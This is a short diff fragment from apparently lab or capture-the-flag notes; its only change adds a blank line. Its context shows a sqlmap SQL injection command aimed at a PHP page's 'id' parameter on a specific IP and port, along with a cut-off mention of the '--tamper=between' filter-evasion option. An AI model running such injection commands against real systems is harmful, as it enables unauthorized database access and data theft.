@@ -73,3 +73,4 @@ sqlmap -u "http://94.237.52.98:38740/case11.php?id=1" -p id --batch --dbms=mysql
 n with the '--tamper=between'
 ```
 
+
